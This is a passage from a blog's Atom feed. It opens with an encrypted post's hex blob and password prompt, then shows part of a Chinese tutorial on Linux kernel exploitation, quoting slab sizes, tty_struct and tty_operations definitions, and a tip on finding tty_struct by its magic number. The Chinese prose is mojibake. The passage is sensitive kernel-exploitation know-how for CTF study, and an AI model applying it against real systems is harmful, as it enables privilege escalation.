0c45e04021a00c60a2a9fd468c925fcc9c0518b99528aab8931ab892d920e0d3257107a79dcae3852eaaa00848b06d36cf509b59bf2e0a1f705aeb89c39a172d2faf4573aa6b004d7d0ed4005a9b52eeb2b65ca681bdb544a9911805affa63efe36cd132a4b2bdd58e68c48a095cb72777854cc66c862958bdf7cb75b567cfe9a4aac16e20e5d0481b22036fe43e60b7b597dae145f2cd5437a56f40fe7a8c9d5026952e95ad35813db4e0c249fa2740ff9b7559e5a2a574d06a4f33f6123d9b8f9a4645f105fe2bc20593cee3064cd49e311cda603400b4ee40e4cfc98ca1727816d76a57329d09f958ff012159079d2350e5c7714869275bf406fc494715e5a0c906703fcc2fdbac714a087e3b4ccc4e32fe44fd7295e4a0800419d0298c7c8b0bf49679489b019877b3b0a5ccc04ef3c95e715a11bcefb6d1f49cc23f44ecdf7effab2882567ca7af4f921117fe9612517f0c5b5942dbf93e659861a01d6116608478424c113f1e971118a464af3cf0cc6819e91ba8d3efd6a8daaeab4718f51fa1e686d2e55f32a71d85a7c9e6a0416e88c4fd1d94e60a6346b306cd0e2c71e24c99a2ede14bf47caa22c67dd9b2e1baa66b720b8e7e9862853ad020ff309a03534a1de892a524257f8e2b15ce903cfb76c868ef022d829d31b33f853758ebac2fca7b36ed1feb77d59cd2e0cfbf73109112029d4afcad757bb1061f7712087e08c0bfa9c53a0039c4b395dda6140ed6ab993a1f81e1266b5d2c04e8dfdb7f1815955c76f3a4e4d94ba6cc9f13f4e654a78f34eb85f8160aa7b392969e72718cf13b99df99e09059d2117c5f596c6e3d4dda8ba347fef0a7aecb8d9eb0b821ccdd29838592f24e5a143d630c52c0d9137f7f00df229f443229ee811f18c5050983092d46081bef50353ca3f2435f9ccb6a22accd4da3d8ed5d2acc1c012e7f331e9fcddf7b8bbb4374729476c4a00a8a72105f0a205193ad4add39987d8008970d3fd45b5d0f10232892e2322bc4d412292124c1b6fd0537d0b37e0d18c113a4489c51541522724c246ed81a59966ef8670de205cd027e5a74cb51be698a41fa5bdfa3d78fefa0b0167e3b74808a2e4186faa16160c9656d0ff0c99c31dedfc91cd014086650a15de47fa8d303429f5d8447320ac08e7e5d9e677388fe618425eb697af587199d9b96223def1f4a99b77bffba83af5896a87221355b5fde1ecafdd5cf3a3c42c70bf96a53ce59c0a7d00099d8a2d8294a10dda6b4de4c0cd377461abe2185497d7076b4e94543ebefdc86b657237cd61eda2d802550f443feb44f90b87f47fafd789e1aa0432ceedad34aaf525b4ae5db096c897cd4da4641756263ea2daf4e7a455a4a081816b761e0c8a4044970e5d79fe4c69267645657f13219853780c34d5b7d51254ce55a0a6dc9c8fecd03935255478b08750d787e9dc20cf39de832d9dda8ae675077a53b92da5fa5106b26c1fdaeecc9b0eb9aec18da1b20ff7d0c5a2a8812a66e7b0aa18bb04c815d86cdb75a222aa2a5244c65d9e981a8945fd5a8f7bdd4b6c5046ec9216e6ba438a7fbb8f37aa9f34e68a16e52cd2d70d27f1c028483af1082198639922a3dd28442e8e85d2aeb2310be2e855ed60d6910ce32766a956f2edf0f426644d69ea7412f12e8f1d03bc671c776af163e9a3e16700028eb74887cbbf1fe8a3fba8f8751ed6f6744b3ce9ae17e46e07e2f458c0c64dd6f19dd728ee14206089f6374e1cc879b77ec0d81aee3ec45561e9b609dbbe3b79762e6488ecae911e3cac558407846f3cc4484cf70a9d7cd79e386371ecd338f5df3c45a7ae9d4ee0517a8eb141004f962fdcc61f60619ac905c3afd85bebbac6814bd9ae629fa330e6ff3146ac5f44b25b6f768e188bc9f948a314cd92359ef894893eb6ab6db5d322486e7484c42f5909222d330f2a97ce03e1d0961c5f2bd8de3e47cfb0859433432f2fc2cd3a905b26b3bc26cfb49f4758aea03fe9ea15bd8683ac016ddea4d3736d4221c3d3808920ae2e2afae3264b011cb9a3b5ffb774f3a13dcde705b4432ff96615c4da8a786dc0bbfeeffd8cef3ec1f1cb8a74aee5083dfa570d2fe381b7d92511445cb2295164e4220da9879b196e5b6b634dc707a791db535aeac0e8ee3ef217dccadbc42de2081c4b67f4b766eca117b131055be2133839b3f2ae5a7312adfe3c055a091901710326c15ec4fd083f10581af7c51402d04c3f05c8c6aa7a7f1bc4c26211645a66e4c3b60eae55af884c08d59e2bdfb685ae2c9dfe0af0780be6786b50b4fca621f7e118530dbd936a5dcaa81c34589992f5ce8df9891b2feb1fcdeeeead7d8a6eeb370e81f57d71952c53dc0f010005b83b6be9918002bfe2428ef5688a37cb5f4f88689bfe4d3c8f566d769fb762388ce285ba501b3250bc2a9d45206eea3fd18e175559e57b2fd3c4ec312a8352ff337a2a45170d199762b830e819eae714f6cb2d31b3751cc2ce2767bd43e25a8b22ef68b94ef110fb642bb9dd76ee6b9e8fe66fd26e939e708ed4034fd6540bc35a4240f2904d9c085dd68f10a45ea53c4904683fccb196b92e6230c48c6e2565c44c366e1356a2ced4e47fba3897da90a5cfb79f1e9ca4e682</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">å½“æ¯ä¸€æ¬¡æ˜Ÿå…‰æ´’ä¸‹ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆå€¼å¾—å®³æ€•</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>ã€PWN.0x02ã€‘Linux Kernel Pwn IIï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§</title>
    <link href="http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/"/>
    <id>http://blog.arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</id>
    <published>2021-11-29T05:51:25.000Z</published>
    <updated>2022-07-03T20:05:41.561Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯å°å°åšé¢˜å®¶</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬ç¯‡åšå®¢ä¸­å‡ºç°çš„æºä»£ç çš†é€‰è‡ª Linux v5.15ï¼Œä¸è¿‡å¤§éƒ¨åˆ†æƒ…å†µä¸‹æœ¬ç¯‡åšæ–‡ä¸­çš„å¤§éƒ¨åˆ†ç»“æ„ä½“éƒ½ä¸ä¼šéšç€ç‰ˆæœ¬æ›´æ–°è€Œå‘ç”Ÿæ”¹åŠ¨</p><h2 id="paholeï¼šæŸ¥é˜…å†…æ ¸ç»“æ„ä½“çš„å·¥å…·"><a href="#paholeï¼šæŸ¥é˜…å†…æ ¸ç»“æ„ä½“çš„å·¥å…·" class="headerlink" title="paholeï¼šæŸ¥é˜…å†…æ ¸ç»“æ„ä½“çš„å·¥å…·"></a>paholeï¼šæŸ¥é˜…å†…æ ¸ç»“æ„ä½“çš„å·¥å…·</h2><p>æœ‰çš„æ—¶å€™åœ¨<del>åšCTFé¢˜</del>è¿›è¡Œå†…æ ¸æ¼æ´åˆ©ç”¨æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šé‡åˆ°å„ç§å¥‡è‘©çš„é€šç”¨åˆ†é…ç»“æ„ä½“å¤§å°ï¼Œè€Œæ¼æ´ç¯å¢ƒæä¾›çš„ç»“æ„ä½“æœ¬èº«ä¸èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æ¯”è¾ƒèˆ’é€‚åœ°å®Œæˆåˆ©ç”¨ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªè¾ƒä¸ºåˆé€‚çš„ç»“æ„ä½“å¸®åŠ©æˆ‘ä»¬å®Œæˆåˆ©ç”¨ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>å¯èƒ½å¤§å®¶ä¼šæƒ³åˆ°ï¼šè‡ªç„¶æ˜¯åˆ©ç”¨è°·æ­Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¯”è¾ƒå¥½ç”¨çš„ç»“æ„ä½“å•¦ï¼æˆ–è€…æ˜¯å¯»æ‰¾ä¸€äº›å‰äººç•™ä¸‹çš„æ•´åˆçš„æˆæœï¼Œæ¯”å¦‚è¯´<a href="https://zplin.me/papers/ELOISE.pdf">è¿™ç¯‡è®ºæ–‡</a>æˆ–è€…æ˜¯å…¶ä»–å¤§å¸ˆå‚…çš„ä¸€äº›æ–‡ç« ï¼Œå¶å°”æˆ–è®¸ä¹Ÿå¯èƒ½åœ¨æŸä¸ªè§’è½ç¿»åˆ°ç¬”è€…çš„è¿™ç¯‡åšå®¢ï¼ˆç¬‘ï¼‰</p><p>ä½†æœ€å¥½çš„åŠæ³•è‡ªç„¶æ˜¯<strong>è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿ</strong>ï¼Œè¿™é‡Œç¬”è€…å‘å¤§å®¶ä»‹ç»ä¸€ä¸ªå·¥å…·â€”â€”<code>pahole</code></p><p>ç”¨æ³•æ¯”è¾ƒç®€å•ï¼Œç›´æ¥æ‰§è¡Œä¾¿èƒ½è·å–<strong>å¯¹åº”å†…æ ¸ä¸­æ‰€æœ‰ç»“æ„ä½“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¤§å°ã€å„æˆå‘˜åç§»é‡ç­‰</strong>ï¼Œè™½ç„¶æœ‰çš„å†…æ ¸ç¼–è¯‘æ—¶ä¸ä¸€å®šä¼šé€‰æ‹©å¯¼å‡ºè¿™ç©æ„æ‰€è¦ç”¨çš„ä¸œè¥¿ï¼Œä½†å„ä¸ªç‰ˆæœ¬å†…æ ¸ä¹‹é—´ä¸ä¼šæœ‰å¤ªå¤§å·®å¼‚ï¼Œæ‰¾ä¸€ä¸ªç›¸åŒç‰ˆæœ¬çš„å†…æ ¸è·‘ä¸€é pahole å³å¯</p><h2 id="slab-amp-amp-slub-amp-amp-slob-åˆ†é…-object-çš„æœ€å°å¤§å°"><a href="#slab-amp-amp-slub-amp-amp-slob-åˆ†é…-object-çš„æœ€å°å¤§å°" class="headerlink" title="slab &amp;&amp; slub &amp;&amp; slob åˆ†é… object çš„æœ€å°å¤§å°"></a>slab &amp;&amp; slub &amp;&amp; slob åˆ†é… object çš„æœ€å°å¤§å°</h2><p>åœ¨ <code>include/linux/slab.h</code> ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p> å³ <strong>slab åˆ†é…å™¨åˆ†é…çš„ object çš„å¤§å°æœ€å°ä¸º 32ï¼Œslob å’Œ slub çš„æœ€å° object å¤§å°ä¸º 8</strong></p><h1 id="0x01-tty-è®¾å¤‡ç»“æ„ä½“"><a href="#0x01-tty-è®¾å¤‡ç»“æ„ä½“" class="headerlink" title="0x01.tty è®¾å¤‡ç»“æ„ä½“"></a>0x01.tty è®¾å¤‡ç»“æ„ä½“</h1><p>tty è®¾å¤‡å¯ä»¥è¯´æ˜¯ kernel pwn å…¥é—¨å½“ä¸­ <em>æœ€ç»å…¸</em> çš„åˆ©ç”¨ç›®æ ‡ï¼Œå°¤å…¶æ˜¯ <code>/dev/ptmx</code> ï¼Œç›¸ä¿¡å¤§å®¶å·²ç»å¯¹å…¶å†ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œä¸è¿‡è¿™é‡Œç¬”è€…è¿˜æ˜¯ç®€å•ä»‹ç»ä¸€ä¸‹è¿™ä¸ªâ€œä¸‡èƒ½â€çš„ tty è®¾å¤‡åŠå…¶ç›¸å…³å†…æ ¸ç»“æ„ä½“</p><h2 id="tty-structï¼ˆkmalloc-1kï¼‰"><a href="#tty-structï¼ˆkmalloc-1kï¼‰" class="headerlink" title="tty_structï¼ˆkmalloc-1kï¼‰"></a>tty_structï¼ˆkmalloc-1kï¼‰</h2><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>include/linux/tty.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct tty_struct - state associated with a tty while open</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @flow.lock: lock for flow members</span></span><br><span class="line"><span class="comment"> * @flow.stopped: tty stopped/started by tty_stop/tty_start</span></span><br><span class="line"><span class="comment"> * @flow.tco_stopped: tty stopped/started by TCOOFF/TCOON ioctls (it has</span></span><br><span class="line"><span class="comment"> *              precedense over @flow.stopped)</span></span><br><span class="line"><span class="comment"> * @flow.unused: alignment for Alpha, so that no members other than @flow.* are</span></span><br><span class="line"><span class="comment"> *         modified by the same 64b word store. The @flow&#x27;s __aligned is</span></span><br><span class="line"><span class="comment"> *         there for the very same reason.</span></span><br><span class="line"><span class="comment"> * @ctrl.lock: lock for ctrl members</span></span><br><span class="line"><span class="comment"> * @ctrl.pgrp: process group of this tty (setpgrp(2))</span></span><br><span class="line"><span class="comment"> * @ctrl.session: session of this tty (setsid(2)). Writes are protected by both</span></span><br><span class="line"><span class="comment"> *          @ctrl.lock and legacy mutex, readers must use at least one of</span></span><br><span class="line"><span class="comment"> *          them.</span></span><br><span class="line"><span class="comment"> * @ctrl.pktstatus: packet mode status (bitwise OR of TIOCPKT_* constants)</span></span><br><span class="line"><span class="comment"> * @ctrl.packet: packet mode enabled</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All of the state associated with a tty while the tty is open. Persistent</span></span><br><span class="line"><span class="comment"> * storage for tty devices is referenced here as @port in struct tty_port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†é…-x2F-é‡Šæ”¾"><a href="#åˆ†é…-x2F-é‡Šæ”¾" class="headerlink" title="åˆ†é…&#x2F;é‡Šæ”¾"></a>åˆ†é…&#x2F;é‡Šæ”¾</h3><p>åœ¨æ³¨é‡Šä¸­æç¤ºæˆ‘ä»¬ï¼šå½“æˆ‘ä»¬æ‰“å¼€ tty è®¾å¤‡æ—¶å†…æ ¸ä¸­ä¾¿ä¼šåˆ›å»ºä¸€ä¸ª tty_structï¼Œé€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬é€‰æ‹©æ‰“å¼€ <code>/dev/ptmx</code> æ¥åœ¨å†…æ ¸ä¸­åˆ†é…ä¸€ä¸ª tty_struct ç»“æ„ä½“ï¼Œç›¸åº”åœ°å½“æˆ‘ä»¬å°†å…¶å…³é—­æ—¶è¯¥ç»“æ„ä½“ä¾¿ä¼šè¢«é‡Šæ”¾å› slab&#x2F;slub ä¸­</p><h3 id="é­”æ•°"><a href="#é­”æ•°" class="headerlink" title="é­”æ•°"></a>é­”æ•°</h3><p>tty_struct çš„é­”æ•°ä¸º <code>0x5401</code>ï¼Œä½äºè¯¥ç»“æ„ä½“çš„å¼€å¤´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¯¹è¯¥é­”æ•°çš„æœç´¢ä»¥é”å®šè¯¥ç»“æ„ä½“ï¼ˆä¾‹å¦‚<a href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Auserfaultfd-heap-spray-Kernel-UAF-stack-migration-KPTI-bypass">å¼ºç½‘æ¯2021-noteook</a>)</p><h2 id="tty-operations"><a href="#tty-operations" class="headerlink" title="*tty_operations"></a><em>*tty_operations</em></h2><p>å†…æ ¸ä¸­ tty è®¾å¤‡çš„ ops å‡½æ•°è¡¨ï¼Œå®šä¹‰äº <code>/include/linux/tty_driver.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span 